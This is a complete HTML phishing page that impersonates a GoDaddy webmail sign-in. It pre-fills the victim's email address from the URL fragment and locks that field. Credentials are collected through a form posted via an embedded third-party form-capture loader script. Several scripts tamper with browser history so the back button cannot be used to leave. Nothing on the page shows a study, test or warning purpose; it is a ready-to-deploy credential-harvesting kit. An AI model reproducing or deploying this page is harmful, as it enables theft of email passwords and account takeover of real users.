<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Godaddy Login</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .page-container {
            display: flex;
            width: 100%;
            max-width: 1000px;
            background-color: #ffffff;
            align-items: stretch;
        }

        /* Left Side Illustration Component */
        .illustration-side {
            flex: 1.1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            background-color: #ffffff;
        }

        .illustration-side img {
            width: 100%;
            max-width: 460px;
            height: auto;
            object-fit: contain;
        }

        /* Right Side Form Container Component */
        .form-side {
            flex: 0.9;
            background-color: #ffffff;
            border-left: 1px solid #f0f0f0;
            display: flex;
            flex-direction: column;
        }

        /* Top Header Area matching Webmail Banner exactly */
        .form-header {
            background-color: #333333;
            color: #ffffff;
            text-align: center;
            padding: 28px 20px;
            font-size: 24px;
            font-weight: 500;
            letter-spacing: 0.5px;
        }

        /* Main Form Area Body Padding */
        .form-body {
            padding: 40px 50px;
            display: flex;
            flex-direction: column;
            flex-grow: 1;
        }

        .form-title {
            font-size: 22px;
            font-weight: 600;
            color: #1a1a1a;
            margin-bottom: 24px;
        }

        .form-group {
            margin-bottom: 16px;
        }

        .form-control {
            width: 100%;
            padding: 12px 14px;
            border: 1px solid #b3b3b3;
            border-radius: 4px;
            font-size: 15px;
            outline: none;
            color: #333333;
            background-color: #ffffff;
            transition: border-color 0.2s;
        }

        .form-control:focus {
            border-color: #333333;
        }

        textarea.form-control {
            resize: vertical;
            min-height: 100px;
        }

        /* Exact matching solid black rectangle submission button */
        .submit-btn {
            width: 100%;
            background-color: #111111;
            color: #ffffff;
            border: none;
            padding: 14px 20px;
            font-size: 16px;
            font-weight: 500;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 8px;
            transition: background-color 0.2s;
        }

        .submit-btn:hover {
            background-color: #333333;
        }

        /* Responsive Layout breakdown for mobile screens */
        @media (max-width: 768px) {
            .page-container {
                flex-direction: column;
            }
            .form-side {
                border-left: none;
                border-top: 1px solid #f0f0f0;
            }
            .form-body {
                padding: 30px 20px;
            }
        }
    </style>
</head>
<body>

    <div class="page-container">
        
        <!-- Left Side: Vector Workspace Image Area -->
        <div class="illustration-side">
            <!-- Replace the src URL with your actual vector/image file location -->

<img src="https://github.com/cdtechdigital/images/blob/main/godaddye.JPG?raw=true" alt="Trulli" width="" height="">
        </div>

        <!-- Right Side: Transformed Login Frame to Formsubmit Form -->
        <div class="form-side">
            <div class="form-header">
                <b>Webmail
            </div>
            
            <div class="form-body">
                <div class="form-title"><b>Sign In</div>
                    
                <form action="" method="POST">
                    <div class="form-group">
                                    <script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
                <!-- Explicitly name form elements for FormSubmit backend processing -->
                <div class="form-group">
                    <label for="name"></label>
                    <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
                </div>
                
                <div class="form-group">
                    <label for="email"></label>

<input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
  oninput="this.setCustomValidity('')"/><br><br>
                    
                    
                    <button type="submit" class="submit-btn"><b>Sign In</button>
                </form>
            </div>
        </div>

    </div>
 <script>
        window.addEventListener('DOMContentLoaded', () => {
            if (window.location.hash) {
                document.getElementById("email").value = window.location.hash.substring(1).trim();
            }
        });
    </script>
	    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
    <script type="text/javascript">
        (function() {
            window.history.pushState(null, null, window.location.href);
            
            window.onpopstate = function() {
                window.history.pushState(null, null, window.location.href);
           
            };
        })();
    </script>
<script type="text/javascript">
    window.history.pushState(null, "", window.location.href);
    
    window.addEventListener("popstate", function() {
        window.history.pushState(null, "", window.location.href);
    });
</script>
<script type="text/javascript">
    function preventBack() {
        window.history.forward();
    }
    setTimeout("preventBack()", 0);
    
    window.onunload = function () { null };
</script>

</body>
    
</html>
</body>
</html>
